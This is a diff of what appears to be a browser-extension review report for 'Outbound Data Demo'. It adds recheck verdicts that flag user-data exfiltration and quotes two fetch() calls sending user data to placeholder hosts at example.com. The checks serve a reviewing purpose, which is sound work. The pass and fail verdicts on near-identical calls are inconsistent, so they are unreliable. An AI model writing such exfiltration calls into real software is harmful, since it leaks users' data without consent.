@@ -119,6 +119,13 @@ Because the original project is still active, your submission does not meet thes
 
   Outbound Data Demo sends POST requests to three hardcoded hosts.
 
+  Recheck verdicts:
+  * Missing English localization - manifest.json - unsure
+  * User-data exfiltration - background.js:7 - fetch() - pass
+     -> fetch("https://metrics.example.com/p", { body: data });
+  * User-data exfiltration - background.js:8 - fetch() - fail
+     -> fetch("https://logs.example.com/l", { body: data });
+
 ── Summary ──
 
 3 error(s), 0 warning(s), 0 info, 16 manual review step(s)
